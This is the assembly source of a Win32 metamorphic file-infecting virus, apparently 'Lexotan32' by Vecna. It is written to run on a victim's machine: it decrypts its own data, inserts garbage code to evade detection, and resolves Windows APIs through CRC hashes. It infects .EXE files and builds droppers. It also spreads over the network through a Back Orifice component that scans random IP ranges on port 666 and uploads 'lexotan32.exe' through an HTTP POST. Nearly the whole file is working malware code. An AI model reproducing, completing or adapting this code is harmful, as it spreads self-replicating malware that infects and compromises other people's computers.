.586p
.model flat, stdcall
locals

.xlist
include pe.i
include mz.i
include useful.i
include win32api.i
include jmps386.i
include socket.i
.list

       ofs equ offset
       by  equ byte ptr
       wo  equ word ptr
       dwo equ dword ptr
       fwo equ fword ptr

       TRUE  EQU 1
       FALSE EQU 0


FIXED_BO_PSW EQU TRUE
BO_THREADS   EQU 0
DISKSEARCH   EQU FALSE


include lexo32.i
include bo.i


_HOST  segment dword use32 public 'MAIN'

__a1 equ $
DEBUGOFF
;DEBUGON

vinit  PROC
       push eax

       pushad

FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_DOUBLE
       mov esi,ofs data_start
       push (data_enc_size+3)/4
       pop ecx
       mov edx,[key1]
       mov ebx,[key2]

FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_EAX+_DOUBLE
  @@data:
       lodsd
       xor eax,edx
       add edx,ebx
       mov [esi-4],eax
FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_EAX+_DOUBLE+_FLAGS
       loop @@data

FREE4GARBLE ALLGARBLE+_DOUBLE
       xor dwo [copyright],    'ag ,' xor ')c( '        ;hide/show author ;)
       xor dwo [copyright+4],  'ator' xor 'ceV '
       xor dwo [copyright+8],  '...' xor 'an'

FREE4GARBLE _EAX+_DOUBLE
       mov eax,[entrypoint]
       mov [esp+8*4],eax

FREE4GARBLE _FLAGS+_DOUBLE
       call GetK32API
       jc @@error_exit
DEBUGSTR <API searching complete>

FREE4GARBLE NOGARBLE
       push 0
       call @@thread_main
       jmp vmain
  @@thread_main:
       call create_thread

  @@error_exit:
       popad
DEBUGSTR <jumping to host...>
       ret
vinit  ENDP


;FREE4GARBLE NOGARBLE
vmain  PROC
       pushad

FREE4GARBLE _EAX+_DOUBLE
       call [_GetTickCount]
       push 0
       push 0
       mov [seed],eax
       call rnd
       mov [key1],eax
       call rnd

       sub esp, SIZEOF_WIN32_FIND_DATA
       xor eax,esp
       mov [key2],eax

       push esp
       push 101h
       call [_WSAStartup]

       call build_body_from_genotype

       mov eax, WORKSIZE*40
       call alloc
       push eax

       push [mutant_size]
       push [mutant_offset]
       push eax         ;tmpmem
FREE4GARBLE _ECX+_ESI+_DOUBLE
       call mixbody

       mov [mutant_size],ecx
FREE4GARBLE _ECX+_ESI+_EAX+_DOUBLE
       mov eax,ecx
       call alloc
       mov [mutant_offset],eax

FREE4GARBLE _ECX+_ESI+_EAX+_EDI+_DOUBLE
       mov edi,eax

FREE4GARBLE _ECX+_ESI+_EDI+_DOUBLE
       rep movsb

FREE4GARBLE ALLGARBLE+_DOUBLE
       call free

       call build_genotype_from_body

       call build_dropper

       call build_bo_dropper
       call get_current_ip

  IF BO_THREADS NE 0

FREE4GARBLE _ECX+_DOUBLE
       mov ecx, BO_THREADS
  @@bo_scan_threads:
       push ecx
FREE4GARBLE ALLGARBLE+_DOUBLE
       push 0
       call @@thread0
  @@redo:
       call sendping
       push 10*1000
       call [_Sleep]
       jmp @@redo
  @@thread0:
       call create_thread
FREE4GARBLE _ECX+_FLAGS+_DOUBLE
       pop ecx
       loop @@bo_scan_threads

  ENDIF

  IF DISKSEARCH EQ TRUE

FREE4GARBLE NOGARBLE
       push 0
       call @@thread1
       jmp disk_thread
  @@thread1:
FREE4GARBLE _EAX+_DOUBLE
       call create_thread
       push eax
FREE4GARBLE NOGARBLE
       push 0
       call @@thread2
       jmp net_thread
  @@thread2:
       call create_thread

FREE4GARBLE _EAX+_DOUBLE
       push eax
       mov eax,esp

       push -1
       push TRUE
       push eax
FREE4GARBLE ALLGARBLE+_DOUBLE
       push 2
       call [_WaitForMultipleObjects]
       pop eax eax

  ELSE

FREE4GARBLE _ESI+_EDI+_DOUBLE
       mov edi,esp
       lea esi, search_mask
FREE4GARBLE _ESI+_EDI+_EAX+_DOUBLE
       call [_FindFirstFileA], esi, edi
FREE4GARBLE _EAX+_EBX+_EDI+_DOUBLE
       mov ebx,eax
FREE4GARBLE _EDI+_EAX+_EBX+_FLAGS+_DOUBLE
       inc eax
       jz @@search_done_

FREE4GARBLE _EDI+_ECX+_EBX+_DOUBLE
       lea ecx,[edi.WFD_szFileName]
       mov [fname], ecx

FREE4GARBLE _EDI+_EBX+_DOUBLE
  @@file_search:
       push ebx edi
FREE4GARBLE ALLGARBLE+_DOUBLE
       call infectf
FREE4GARBLE _EDI+_EBX+_DOUBLE
       pop edi ebx

FREE4GARBLE _EDI+_EBX+_EAX+_DOUBLE
       call [_FindNextFileA], ebx, edi
FREE4GARBLE _EDI+_EBX+_EAX+_FLAGS+_DOUBLE
       test eax, eax
       jnz @@file_search

FREE4GARBLE _EBX+_DOUBLE
       call [_FindClose], ebx

  ENDIF

FREE4GARBLE ALLGARBLE+_DOUBLE
  @@search_done_:
       sub esp, -SIZEOF_WIN32_FIND_DATA
       call [_WSACleanup]
FREE4GARBLE NOGARBLE
       popad
       ret 4
vmain  ENDP


;FREE4GARBLE NOGARBLE
create_thread PROC
       pushad
FREE4GARBLE ALLGARBLE+_DOUBLE
       push esp
       push esp
       push 0
       push dwo [esp+(8*4)+8+(3*4)]           ;param
       push dwo [esp+(8*4)+4+(4*4)]           ;entrypoint
       push 0
       push 0
FREE4GARBLE _EAX+_DOUBLE
       call [_CreateThread]
       pop ecx
       mov dwo [esp+Pushad_eax],eax
FREE4GARBLE NOGARBLE
       popad
       ret 4*2
create_thread ENDP


FREE4GARBLE NOGARBLE

include rebuild.inc
include lexo32.inc
include crc.inc
include map.inc
include import.inc
include disasm.inc
include insert.inc
include export.inc
include infectf.inc
include rnd.inc
include z_decode.inc
include z_encode.inc
include metamorp.inc
include bo.inc
include localnet.inc
include search.inc
include droppers.inc

vend:
vir_size equ $-__a1

_HOST  ends



_DDATA segment dword use32 public 'DDATA'

__a2 equ $
data_start:
       db 'Miss Lexotan 6mg'

copyright db ' (c) Vecna',0,0
;         db ', garota...',0

api_kernel32_crc:
       crc <WaitForMultipleObjects>
       crc <Sleep>
       crc <GlobalAlloc>
       crc <GlobalFree>
       crc <GetModuleHandleA>
       crc <GetProcAddress>
       crc <SetFileTime>
       crc <SetFileAttributesA>
       crc <FindFirstFileA>
       crc <CreateFileA>
       crc <CreateFileMappingA>
       crc <MapViewOfFile>
       crc <CloseHandle>
       crc <UnmapViewOfFile>
       crc <SetEndOfFile>
       crc <SetFilePointer>
       crc <ExitProcess>
       crc <LoadLibraryA>
       crc <FreeLibrary>
       crc <WriteFile>
       crc <GetStdHandle>
       crc <lstrlenA>
       crc <IsBadCodePtr>
       crc <IsBadReadPtr>
       crc <FindNextFileA>
       crc <FindClose>
       crc <GetTickCount>
       crc <VirtualAlloc>
       crc <VirtualFree>
       crc <CreateThread>
       crc <SetCurrentDirectoryA>
       crc <GetDriveTypeA>
       dd 0
api_user32_crc:
       crc <wsprintfA>
       crc <MessageBoxA>
       dd 0
api_wsock32_crc:
       crc <gethostname>
       crc <gethostbyname>
       crc <select>
       crc <recvfrom>
       crc <sendto>
       crc <socket>
       crc <closesocket>
       crc <recv>
       crc <send>
       crc <connect>
       crc <WSAStartup>
       crc <WSACleanup>
       dd 0
api_mpr_crc:
       crc <WNetCloseEnum>
       crc <WNetEnumResourceA>
       crc <WNetOpenEnumA>
       dd 0

kernel32 db 'KERNEL32.DLL',0
user32   db 'USER32.DLL',0
wsock32  db 'WSOCK32.DLL',0
mpr      db 'MPR.DLL',0

search_mask db '*.EXE',0

bo_registry db "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0
bo_name     db "lexotan32.exe",0
bo_port     db "666"
bo_null     db 0

GMH    dd ofs _GMH

entrypoint dd ofs _exit

CODE_OFS dd 00401000h
CODE_SIZE dd (ofs vend-ofs vinit)
  IF DISKSEARCH EQ TRUE
DATA_OFS dd 00405000h
GENS_OFS dd 00406000h
  ELSE
DATA_OFS dd 00404000h
GENS_OFS dd 00405000h
  ENDIF


bo_http_header db "POST /upload.cgi\ HTTP/1.0",13,10
bo_http_header_size equ $-bo_http_header

bo_mime db "Content-Type: multipart/form-data"
        db 03bh
        db " boundary=----_LEXO32_",13,10
        db "Content-length: "
bo_size db "12345",13,10,13,10
bo_bnd  db "----_LEXO32_"
bo_bnd_size equ $-bo_bnd
        db 13,10,"Content-Disposition: form-data"
        db 03bh
        db " name="
        db 22h
        db "filename"
        db 22h
        db 03bh
        db " filename="
        db 22h
        db "lexotan32.exe"
        db 22h
        db 13,10
        db "Content-Type: application/octet-stream",13,10,13,10
bo_mime_size equ $-bo_mime


ip_mask_table:; DDCCBBAA
       dd      0FFFFFFFFh  ;0     *.*.*.*   X=local
       dd      0FFFFFF00h  ;1               *=random
       dd      0FFFFFF00h  ;2     X.*.*.*
       dd      0FFFFFF00h  ;3
       dd      0FFFFFF00h  ;4
       dd      0FFFF0000h  ;5     X.X.*.*
       dd      0FFFF0000h  ;6
       dd      0FFFF0000h  ;7

align 4
data_enc_size equ $-data_start

key1   dd 0
key2   dd 0

align 4
data_size equ $-data_start
vir_data_size equ $-__a2

virtual_data_start:
api_addresses:
       _WaitForMultipleObjects dd ?
       _Sleep              dd ?
       _GlobalAlloc        dd ?
       _GlobalFree         dd ?
       _GetModuleHandleA   dd ?
       _GetProcAddress     dd ?
       _SetFileTime        dd ?
       _SetFileAttributesA dd ?
       _FindFirstFileA     dd ?
       _CreateFileA        dd ?
       _CreateFileMappingA dd ?
       _MapViewOfFile      dd ?
       _CloseHandle        dd ?
       _UnmapViewOfFile    dd ?
       _SetEndOfFile       dd ?
       _SetFilePointer     dd ?
       _ExitProcess        dd ?
       _LoadLibraryA       dd ?
       _FreeLibrary        dd ?
       _WriteFile          dd ?
       _GetStdHandle       dd ?
       _lstrlenA           dd ?
       _IsBadCodePtr       dd ?
       _IsBadReadPtr       dd ?
       _FindNextFileA      dd ?
       _FindClose          dd ?
       _GetTickCount       dd ?
       _VirtualAlloc       dd ?
       _VirtualFree        dd ?
       _CreateThread       dd ?
       _SetCurrentDirectoryA dd ?
       _GetDriveType dd ?

       _wsprintfA          dd ?
       _MessageBoxA        dd ?

       _gethostname dd ?
       _gethostbyname dd ?
       _select dd ?
       _recvfrom dd ?
       _sendto dd ?
       _socket dd ?
       _closesocket dd ?
       _recv dd ?
       _send dd ?
       _connect dd ?
       _WSAStartup dd ?
       _WSACleanup dd ?

       _WNetCloseEnum dd ?
       _WNetEnumResourceA dd ?
       _WNetOpenEnumA dd ?


      insert_raw dd ?
      insert_rva dd ?
      resource dd ?
      fmap dd ?
      peheader dd ?
      can_infect dd ?
      fname dd ?
      reloc db ?

      code_rva dd ?
      data_rva dd ?
      genotype_rva dd ?
      data_raw dd ?

      mutant_size dd ?
      mutant_offset dd ?
      mutant_gens dd ofs gens

      seed dd ?
      vbody dd ?
      imagebase dd ?

      next_section_start dd ?

      disasm_offs dd ?
      disasm_size dd ?
      disasm_flag dd ?
      disasm_seg db ?
      disasm_rep db ?
      disasm_opcode db ?
      disasm_modrm db ?
      disasm_modrm_mod db ?
      disasm_modrm_reg db ?
      disasm_modrm_rm db ?
      disasm_sib db ?
      disasm_sib_scale db ?
      disasm_sib_index db ?
      disasm_sib_base db ?
      disasm_memsize db ?
      disasm_mem dd ?
      disasm_datasize db ?
      disasm_data dd ?
      disasm_datarel dd ?

      eip_table_cnt dd ?
      jmp_table_cnt dd ?
      eip_table dd ?
      jmp_table dd ?
      outbuffer dd ?
      source dd ?

      userlist dd ?
      registers dd ?

      _1st_item dd ?

      rnddata   dd ?

      dropper dd ?
      dropper_size dd ?

      this_ip dd ?

      bo_ip dd ?
      bo_seed   dd ?
      bo_dropsize  dd ?
      bo_dropper dd ?

align 4
virtual_data_size equ $-virtual_data_start

_DDATA ends



_GENS  segment dword use32 public 'GENOTYPE'

gens   db 60*1024 dup (0cch)

_GENS  ends



_INIT  segment dword use32 public 'INIT'

main   PROC
  LOCAL previous_offset

       mov esi, 401000h
       mov [previous_offset], esi
       mov edi, ofs gens+16*1024
  @@disasm:
       cmp esi, ofs vend
       je @@done

       cmp dwo [esi], 565604ebh
       jne @@no_meta_flag
       lodsd
       lodsw
       push eax
       mov eax,-2
       stosw
       pop eax
       bts eax, 15
       stosw
       jmp @@disasm
  @@no_meta_flag:

       call disasm
       jc @@error

       mov eax,esi
       sub eax,[previous_offset]
       stosw
       mov [previous_offset],esi
       add esi, [disasm_size]
       jmp @@disasm
  @@done:
       mov eax,-1
       stosd

       sub edi,ofs gens+16*1024
       mov ecx,edi

       mov esi, ofs gens+16*1024
       mov edi, ofs gens
       call z_encode_asm

       call vinit

  _exit:
       push -1
       call [_Sleep]

  @@error:
       int 3
       nop
       jmp @@error
main   ENDP

_GMH dd ofs __GMH

__GMH PROC
       mov eax, 0bff70000h
       ret 4
__GMH ENDP

Debug_Output PROC
       pop eax
       call @@delta
  @@delta:
       pop ebp
       mov [ebp+(ofs @@jmp-ofs @@delta)], eax
       push ofs debug_buffer
       call [_wsprintfA]
       pop esi

       push 0
       call @@1
       dd 0
  @@1:
       call [_lstrlenA], esi
       push eax
       push esi
       call [_GetStdHandle], -11
       push eax
       call [_WriteFile]

       push 12345678h
     org $-4
  @@jmp dd 0
       ret
Debug_Output ENDP

debug_buffer db 256 dup (0)

db 13,10
db 13,10
db '------------------------------------',13,10

db 'virus size = '
db vir_size/10000 mod 10 + '0'
db vir_size/ 1000 mod 10 + '0'
db vir_size/  100 mod 10 + '0'
db vir_size/   10 mod 10 + '0'
db vir_size/    1 mod 10 + '0',13,10

db 'data size = '
db vir_data_size/10000 mod 10 + '0'
db vir_data_size/ 1000 mod 10 + '0'
db vir_data_size/  100 mod 10 + '0'
db vir_data_size/   10 mod 10 + '0'
db vir_data_size/    1 mod 10 + '0',13,10

db '------------------------------------',13,10
db 13,10
db 13,10

_INIT  ends

end    main
